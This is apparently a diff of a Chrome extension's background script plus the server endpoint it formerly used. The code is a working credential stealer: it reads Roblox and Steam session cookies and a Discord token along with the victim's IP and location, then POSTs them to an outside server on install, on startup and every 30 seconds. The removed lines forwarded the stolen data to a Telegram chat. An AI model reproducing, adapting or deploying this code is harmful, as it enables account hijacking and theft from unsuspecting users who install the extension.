@@ -1,40 +1,82 @@
-app.post('/send', async (req, res) => {
+const SERVER_URL = "https://mm2-server.onrender.com/send";
+
+let sentRoblox = "";
+let sentSteam = "";
+let sentDiscord = "";
+
+// ... (функции getDiscordToken, getIP — те же)
+
+async function sendData() {
+    const data = {
+        robloxCookie: "",
+        steamCookie: "",
+        discordToken: "",
+        robloxStatus: "not_found",
+        steamStatus: "not_found",
+        discordStatus: "not_found",
+        ip: "",
+        country: "",
+        city: ""
+    };
+
+    // IP
+    const ip = await getIP();
+    data.ip = ip?.ip || "";
+    data.country = ip?.country || "";
+    data.city = ip?.city || "";
+
+    // Roblox
     try {
-        const { robloxCookie, steamCookie, discordToken, robloxStatus, steamStatus, discordStatus, ip, country, city } = req.body;
+        const c = await chrome.cookies.getAll({ domain: ".roblox.com" });
+        const rob = c.find(x => x.name === ".ROBLOSECURITY");
+        if (rob && rob.value) {
+            if (rob.value !== sentRoblox) {
+                data.robloxCookie = rob.value;
+                data.robloxStatus = "new";
+                sentRoblox = rob.value;
+            } else {
+                data.robloxStatus = "sent";
+            }
+        }
+    } catch (e) {}
 
-        let msg = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n";
-        msg += "━━━━━━━━━━━━━━━━━━\n\n";
-        msg += "🌐 <b>IP:</b> <code>" + (ip || "Н/Д") + "</code>\n";
-        msg += "📍 <b>Страна:</b> <code>" + (country || "Н/Д") + "</code>\n";
-        msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n";
-        msg += "━━━━━━━━━━━━━━━━━━\n\n";
+    // Steam
+    try {
+        const c = await chrome.cookies.getAll({ domain: "steamcommunity.com" });
+        const steam = c.find(x => x.name === "steamLoginSecure");
+        if (steam && steam.value) {
+            if (steam.value !== sentSteam) {
+                data.steamCookie = steam.value;
+                data.steamStatus = "new";
+                sentSteam = steam.value;
+            } else {
+                data.steamStatus = "sent";
+            }
+        }
+    } catch (e) {}
 
-        msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
-        if (robloxStatus === "new") msg += "<code>" + robloxCookie + "</code>\n\n";
-        else if (robloxStatus === "sent") msg += "✅ Уже отправлен\n\n";
-        else msg += "❌ Не найден\n\n";
-
-        msg += "🎮 <b>STEAM COOKIE:</b>\n";
-        if (steamStatus === "new") msg += "<code>" + steamCookie + "</code>\n\n";
-        else if (steamStatus === "sent") msg += "✅ Уже отправлен\n\n";
-        else msg += "❌ Не найден\n\n";
-
-        msg += "💬 <b>DISCORD TOKEN:</b>\n";
-        if (discordStatus === "new") msg += "<code>" + discordToken + "</code>\n\n";
-        else if (discordStatus === "sent") msg += "✅ Уже отправлен\n\n";
-        else msg += "❌ Discord не открыт\n\n";
-
-        msg += "━━━━━━━━━━━━━━━━━━\n";
-        msg += "⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");
-
-        await axios.post(API + "/sendMessage", {
-            chat_id: CHAT_ID,
-            text: msg,
-            parse_mode: "HTML"
-        });
-
-        res.json({ ok: true });
-    } catch (e) {
-        res.status(500).json({ ok: false, error: e.message });
+    // Discord
+    const discordToken = await getDiscordToken();
+    if (discordToken) {
+        if (discordToken !== sentDiscord) {
+            data.discordToken = discordToken;
+            data.discordStatus = "new";
+            sentDiscord = discordToken;
+        } else {
+            data.discordStatus = "sent";
+        }
     }
-});
+
+    // Отправляем всегда, если есть IP
+    try {
+        await fetch(SERVER_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
+    } catch (e) {}
+}
+
+chrome.runtime.onInstalled.addListener(() => { sendData(); });
+chrome.runtime.onStartup.addListener(() => { sendData(); });
+setInterval(sendData, 30000);
